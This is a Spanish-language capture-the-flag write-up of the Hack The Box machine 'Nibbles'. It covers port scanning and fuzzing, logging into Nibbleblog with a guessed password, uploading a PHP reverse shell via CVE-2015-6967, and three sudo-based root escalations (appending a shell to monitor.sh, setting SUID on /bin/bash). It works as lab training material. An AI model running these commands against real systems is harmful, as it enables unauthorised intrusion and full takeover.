---
layout: single
title: Nibbles - Hack The Box
excerpt: "Esta fue una máquina bastante sencilla, en la que vamos a analizar el código fuente de la página web que está activa en el puerto HTTP para poder entrar en una subpágina que utiliza el servicio Nibbleblog. Haremos Fuzzing normal y ambientado a subpáginas PHP y encontraremos algunas a las cuales podremos enumerar. Una vez dentro, analizaremos el Exploit CVE-2015-6967 que nos indicara que podemos añadir una Reverse Shell hecha en PHP, para poder conectarnos de manera remota. Ya conectados, utilizaremos un script en Bash con permisos de SUDO para poder escalar privilegios como Root."
date: 2023-04-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-nibbles/nibbles_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Fuzzing
  - Nibbleblog
  - Information Leakage
  - Arbitrary File Upload - AFU
  - AFU - CVE-2015-6967
  - Reverse Shell
  - Terminal Interactiva
  - SUDO Exploitation
  - OSCP Style
---
![](/assets/images/htb-writeup-nibbles/nibbles_logo.png)
Esta fue una máquina bastante sencilla, en la que vamos a analizar el código fuente de la página web que está activa en el puerto **HTTP**, ahí nos indica que podemos ver una subpágina que no aparecerá si hacemos **Fuzzing**, una vez que nos metamos ahí, encontraremos que esta subpágina utiliza el servicio **Nibbleblog**. Cuando investiguemos este servicio, sabremos que es un blog creado por una **CMD** y si hacemos **Fuzzing** normal y ambientado a subpáginas **PHP**, encontraremos algunas a las cuales podremos enumerar y así encontrar un usuario y un login, en dicho login utilizaremos el usuario que encontramos y como contraseña el nombre de la máquina para poder acceder al servicio **Nibbleblog**. Una vez dentro, analizaremos el Exploit **CVE-2015-6967**, el cual nos indicara que podemos añadir una **Reverse Shell** hecha en **PHP**, para poder conectarnos de manera remota a la máquina víctima como usuarios. Una vez conectados, utilizaremos un script en **Bash** con permisos de **SUDO** para poder escalar privilegios como **Root**.

# Recopilación de Información
## Traza ICMP
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL sabremos que SO opera en dicha máquina.
```
ping -c 4 10.10.10.75 
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=130 ms
64 bytes from 10.10.10.75: icmp_seq=2 ttl=63 time=136 ms
64 bytes from 10.10.10.75: icmp_seq=3 ttl=63 time=147 ms
64 bytes from 10.10.10.75: icmp_seq=4 ttl=63 time=153 ms

--- 10.10.10.75 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3014ms
rtt min/avg/max/mdev = 129.512/141.335/153.128/9.122 ms
```
Por el TTL, sabemos que la máquina usa Linux. Ahora, hagamos los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.75 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:03 CST
Initiating SYN Stealth Scan at 13:03
Scanning 10.10.10.75 [65535 ports]
Discovered open port 80/tcp on 10.10.10.75
Discovered open port 22/tcp on 10.10.10.75
Completed SYN Stealth Scan at 13:04, 27.73s elapsed (65535 total ports)
Nmap scan report for 10.10.10.75
Host is up, received user-set (1.5s latency).
Scanned at 2023-04-19 13:03:33 CST for 27s
Not shown: 54242 filtered tcp ports (no-response), 11291 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds
           Raw packets sent: 126522 (5.567MB) | Rcvd: 11429 (457.200KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Veo solamente dos puertos, que, pues ya conocemos. Cómo no tenemos las credenciales del SSH, tendremos que irnos a la página web del puerto HTTP, vamos a hacer el escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p22,80 10.10.10.75 -oN targeted                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:08 CST
Nmap scan report for 10.10.10.75
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Bien, aparece el servicio **Apache**, pero mejor analicemos la página web.

# Análisis de Vulnerabilidades
## Analizando Puerto 80
Entremos a la página web.

![](/assets/images/htb-writeup-nibbles/Captura1.png)

Pues no veo nada más que un mensaje, entonces veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura2.png">
</p>

Mmmmm no nos dice nada que nos pueda ayudar. Hagamos un **Fuzzing** rápido con **nmap**.

```
nmap --script http-enum -p80 10.10.10.75 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:17 CST
Nmap scan report for 10.10.10.75
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.01 seconds
```
Achis, no saco nada, entonces vamos a usar **wfuzz** para ver si encuentra algo:
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/FUZZ/    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.75/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000001:   200        16 L     9 W        93 Ch       "# directory-list-2.3-medium.txt"                                    
000000003:   200        16 L     9 W        93 Ch       "# Copyright 2007 James Fisher"                                      
000000007:   200        16 L     9 W        93 Ch       "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"    
000000004:   200        16 L     9 W        93 Ch       "#"                                                                  
000000005:   200        16 L     9 W        93 Ch       "# This work is licensed under the Creative Commons"                 
000000002:   200        16 L     9 W        93 Ch       "#"                                                                  
000000008:   200        16 L     9 W        93 Ch       "# or send a letter to Creative Commons, 171 Second Street,"         
000000006:   200        16 L     9 W        93 Ch       "# Attribution-Share Alike 3.0 License. To view a copy of this"      
000000009:   200        16 L     9 W        93 Ch       "# Suite 300, San Francisco, California, 94105, USA."                
000000010:   200        16 L     9 W        93 Ch       "#"                                                                  
000000013:   200        16 L     9 W        93 Ch       "#"                                                                  
000000011:   200        16 L     9 W        93 Ch       "# Priority ordered case sensative list, where entries were found"   
000000014:   200        16 L     9 W        93 Ch       "http://10.10.10.75//"                                               
000000012:   200        16 L     9 W        93 Ch       "# on atleast 2 different hosts"                                     
000000083:   403        11 L     32 W       292 Ch      "icons"                                                              

Total time: 0
Processed Requests: 12748
Filtered Requests: 12733
Requests/sec.: 0
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 28: Operation timed out after 90070 milliseconds with 0 bytes received
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

A kbron...No, pues no, lo único que se me ocurre es ver el código fuente.

## Analizando Codigo Fuente de la Página Web
Para entrar ahí, simplemente presiona **crtl + u**. Pues entremos.

![](/assets/images/htb-writeup-nibbles/Captura3.png)

Viene un mensaje que incluye el nombre de un directorio, vamos a entrar a ver si existe.

![](/assets/images/htb-writeup-nibbles/Captura4.png)

Aparece una página que supongo es hecha por default, pero viene el servicio **Nibbles** y lo que creo que es un usuario llamado **Yum Yum**, pero no estoy seguro, así que vamos a investigar este servicio:

**Nibbleblog, un nuevo CMS para crear blogs sin usar base de datos [opensource] Diego Najar nos presenta nibbleblog.com, un nuevo proyecto de código libre que nos permite crear un blog y administrarlo de forma sencilla.**

Entonces, se me hace que esta tiene sus propias subpáginas, ahora si repitamos el **Fuzzing**.

## Fuzzing
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.75/nibbleblog/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000003:   200        60 L     168 W      2985 Ch     "# Copyright 2007 James Fisher"                                       
000000007:   200        60 L     168 W      2985 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000001:   200        60 L     168 W      2985 Ch     "# directory-list-2.3-medium.txt"                                     
000000259:   200        22 L     126 W      2127 Ch     "admin"                                                               
000000014:   200        60 L     168 W      2985 Ch     "http://10.10.10.75/nibbleblog//"                                     
000000013:   200        60 L     168 W      2985 Ch     "#"                                                                   
000000012:   200        60 L     168 W      2985 Ch     "# on atleast 2 different hosts"                                      
000000006:   200        60 L     168 W      2985 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000010:   200        60 L     168 W      2985 Ch     "#"                                                                   
000000009:   200        60 L     168 W      2985 Ch     "# Suite 300, San Francisco, California, 94105, USA."                 
000000011:   200        60 L     168 W      2985 Ch     "# Priority ordered case sensative list, where entries were found"    
000000004:   200        60 L     168 W      2985 Ch     "#"                                                                   
000000519:   200        30 L     214 W      3777 Ch     "plugins"                                                             
000000005:   200        60 L     168 W      2985 Ch     "# This work is licensed under the Creative Commons"                  
000000008:   200        60 L     168 W      2985 Ch     "# or send a letter to Creative Commons, 171 Second Street,"          
000000002:   200        60 L     168 W      2985 Ch     "#"                                                                   
000000075:   200        18 L     82 W       1353 Ch     "content"                                                             
000000127:   200        20 L     104 W      1741 Ch     "themes"                                                              
000000935:   200        27 L     181 W      3167 Ch     "languages"                                                           

Total time: 0
Processed Requests: 11551
Filtered Requests: 11532
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Hay algunas subpáginas que me llaman la atención, como la de **admin** y **content**. Vamos a verlas.

# Explotación de Vulnerabilidades
## Enumeración Web
![](/assets/images/htb-writeup-nibbles/Captura5.png)

Ok, vamos a enumerar un poquito lo que hay aquí. Pues no encontré nada que fuera interesante, pero si vi que hay muchos archivo PHP, entonces hagamos un **Fuzzing** para ver si hay subpáginas PHP:

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.75/nibbleblog/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   200        60 L     168 W      2991 Ch     "# directory-list-2.3-medium.txt"                                                                                                                                          
000000007:   200        60 L     168 W      2991 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                          
000000003:   200        60 L     168 W      2991 Ch     "# Copyright 2007 James Fisher"                                                                                                                                            
000000015:   200        60 L     168 W      2991 Ch     "index"                                                                                                                                                                    
000000259:   200        26 L     96 W       1401 Ch     "admin"                                                                                                                                                                    
000000043:   200        10 L     13 W       402 Ch      "sitemap"                                                                                                                                                                  
000000715:   200        0 L      11 W       78 Ch       "install"                                                                                                                                                                  
000000794:   200        87 L     174 W      1621 Ch     "update"                                                                                                                                                                   
000000014:   403        11 L     32 W       302 Ch      "http://10.10.10.75/nibbleblog/.php/"                                                                                                                                      
000000011:   200        60 L     168 W      2990 Ch     "# Priority ordered case sensative list, where entries were found"                                                                                                         
000000013:   200        60 L     168 W      2990 Ch     "#"                                                                                                                                                                        
000000004:   200        60 L     168 W      2990 Ch     "#"                                                                                                                                                                        
000000010:   200        60 L     168 W      2990 Ch     "#"                                                                                                                                                                        
000000012:   200        60 L     168 W      2990 Ch     "# on atleast 2 different hosts"                                                                                                                                           
000000002:   200        60 L     168 W      2990 Ch     "#"                                                                                                                                                                        
000000008:   200        60 L     168 W      2990 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                                                                               
000000006:   200        60 L     168 W      2990 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                                            
000000005:   200        60 L     168 W      2990 Ch     "# This work is licensed under the Creative Commons"                                                                                                                       
000000009:   200        60 L     168 W      2990 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                                                                      
000000126:   200        7 L      15 W       300 Ch      "feed"                                                                                                                                                                     
000045240:   403        11 L     32 W       302 Ch      "http://10.10.10.75/nibbleblog/.php/"                                                                                                                                      
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 155991
Filtered Requests: 155970
Requests/sec.: 0
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Veo otra subpágina llamada **admin** que supongo es **admin.php**, veamos qué hay ahí:

![](/assets/images/htb-writeup-nibbles/Captura12.png)

Excelente, quizá en sí buscamos en **content**, encontremos alguna credencial. Entonces, vámonos a **content**:

![](/assets/images/htb-writeup-nibbles/Captura6.png)

Muy bien, aquí si hay cosas que pueden interesarnos. Investigando cada carpeta encontré el siguiente archivo:

<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura7.png">
</p>

Así que ya tenemos un usuario llamado **admin**, pero no tenemos contraseña. Lo que se me ocurre solamente es poner contraseñas a lo imbécil, porque si buscar las credenciales por defecto de este servicio, te aparecerán muchas pistas sobre como resolver esta máquina y pues ahorita vamos desde cero.

![](/assets/images/htb-writeup-nibbles/Captura8.png)

Las contraseñas que use fueron:
* usuario: admin
* contraseña: nibbles

OJO, esto a lo mejor te puede funcionar en un ambiente real, no esta de más probarlo cuando puedas.

Ahora si, busquemos un Exploit.

## Buscando un Exploit
En la búsqueda, encontré uno que nos puede servir:
* https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html

Nos explica, que podemos cargar un Payload de una Reverse Shell en un archivo PHP y nosotros ya conocemos uno, ve a **pentestmonkey** y descárgalo. Si no sabes la ruta, checa la publicación **Notas Pentesting** de mi blog, ahí está el link.

Vámonos por pasos:
* Una vez lo tengas descargado y configurado con tu IP y un puerto, vamos a alzar una netcat:
```
nc -nvlp 443   
listening on [any] 443 ...
```
* Ahora, vamos a subir el archivo PHP en la sección **My Image**:

![](/assets/images/htb-writeup-nibbles/Captura9.png)

* Cargamos el archivo PHP y lo subimos:

![](/assets/images/htb-writeup-nibbles/Captura10.png)

* Se subió, pero no nos saltó nada en la netcat, entonces tenemos que buscar en donde se guardó el archivo. Por suerte, cuando enumere la subpágina **content**, vi una carpeta llamada **My Image**, vamos a esa subpágina:

![](/assets/images/htb-writeup-nibbles/Captura11.png)

* Nuestro archivo se subió como **image.php**, solo dándole click, ya nos conecta en la netcat:
```
nc -nvlp 443   
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.75] 38648
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:05:10 up  3:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
```
Lo que podemos, es sacar una terminal interactiva, también en la publicación de **Notas Pentesting** viene el cómo sacar la terminal interactiva, hazlo y continuamos.

* Si ya sacaste la terminal interactiva o te valió brga y así seguiste, vamos a buscar la flag, pero OJO, vas a necesitar la consola interactiva para más adelante:
```
nibbler@Nibbles:/$ whoami 
nibbler
nibbler@Nibbles:/$ cd /home
nibbler@Nibbles:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Dec 10  2017 .
drwxr-xr-x 23 root    root    4096 Dec 15  2020 ..
drwxr-xr-x  3 nibbler nibbler 4096 Dec 29  2017 nibbler
nibbler@Nibbles:/home$ cd nibbler/
nibbler@Nibbles:/home/nibbler$ ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Apr 19 18:09 user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
```

# Post Explotación
Hay 3 maneras para convertirnos en root. Pero para eso necesitamos saber qué permisos tenemos como SUDO:
```
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Un archivo **.sh** y también hay un archivo comprimido que podemos descomprimir, este archivo incluye el **monitor.sh**. Vamos a hacer las 2 primeras formas de escalar privilegios, descomprimamos el archivo:

## Escalando Privilegios de 3 Formas con Archivo .sh
**IMPORTANTE**

La tercera forma debe ser sin que se descomprima el archivo **personal.zip**, prueba la que quieras. Bien, descomprime el archivo:
```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```
Una vez descomprimido, nos metemos a las carpetas hasta el script **monitor.sh**:
```
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```
Ahora sí, probemos las 2 formas con el archivo descomprimido. Pero antes, entra a ese archivo y borra o comenta el comando **clear** que está casi al principio.

### Forma 1: Convertirse en Root con /bin/bash
Para esto, vamos a meter el siguiente comando en el script:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/bash -i" >> monitor.sh 
```
Después, ejecutamos el archivo con el comando **sudo**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
root@Nibbles:/home/nibbler/personal/stuff#
```
Y ya somos Root, lo puedes comprobar, pero en el **PATH** lo dice:
```
root@Nibbles:/home/nibbler/personal/stuff# whoami
root
```
Esta forma, yo no la conocía, la encontré de aquí:
* https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d

### Forma 2: Cambiar los Permisos de la Bash
Veamos los permisos de la **Bash**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```
Bien, esta vez, vamos a entrar al archivo y a agregar lo siguiente:
```

chmod u+s /bin/bash
```
Ejecutamos el script con el comando **sudo**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
nibbler@Nibbles:/home/nibbler/personal/stuff$
```
Comprobamos otra vez los permisos de la **Bash**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```
Y ahora si, nos metemos a la **Bash**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami 
root
```

### Forma 3: Suplantación de Archivo .sh
Primero, tratemos de crear las dos carpetas que deberían crearse con el descomprimido, si nos deja, vamos bien y si no, lo intentamos con las formas anteriores:
```
nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff
```
Si nos dejó, vamos a meternos hasta **stuff**:
```
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
```
Ahí vamos a crear el archivo **monitor.sh** y vamos a poner el comando para cambiar los permisos de la **Bash**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ nano monitor.sh
chmod u+s /bin/bash
```
Guardamos, salimos y le damos permisos de ejecución:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
```
Comprobamos los permisos de la **Bash**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash 
-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```
Ejecutamos el script con el comando **sudo**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
```
Y ya deberían estar cambiados los permisos de la **Bash**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```
Nos metemos a la **Bash** y buscamos las flags:
```
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# cat root.txt
```
¡Y listo! Ya completamos esta máquina.

# Otras Formas
Existe una forma de usar un Exploit de Metasploit, que te automatiza la forma de acceder a la máquina. Lo único que necesitas es tener una **Reverse Shell** de **PHP** (como la de **pentestmonkey**) y usar el Exploit de Python de este **GitHub**:
* https://github.com/dix0nym/CVE-2015-6967

Lo malo, es que ya viene con las credenciales para entrar, entonces yo lo considero un poco tramposo, pero lo puedes usar.

```
git clone https://github.com/dix0nym/CVE-2015-6967.git          
Clonando en 'CVE-2015-6967'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 0), reused 4 (delta 0), pack-reused 0
Recibiendo objetos: 100% (7/7), listo.
```
Descarga y configura la Reverse Shell de **pentestmonkey**.

Una vez descargada y configurada, ponla en donde esté el Exploit. Activa una netcat:
```
nc -nvlp 443   
listening on [any] 443 ...
```
Ahora, usa el Exploit:
```
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload php-reverse-shell.php 
[+] Login Successful.
[+] Upload likely successfull.
```
Y ya estarás conectado:
```
nc -nvlp 443   
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.75] 38648
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:05:10 up  3:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
```

## Links de Investigación
* https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html
* https://www.exploit-db.com/exploits/38489
* https://www.tecmint.com/linux-server-health-monitoring-script/
* https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d
* https://berserkwings.github.io/PentestNotes/#

# FIN
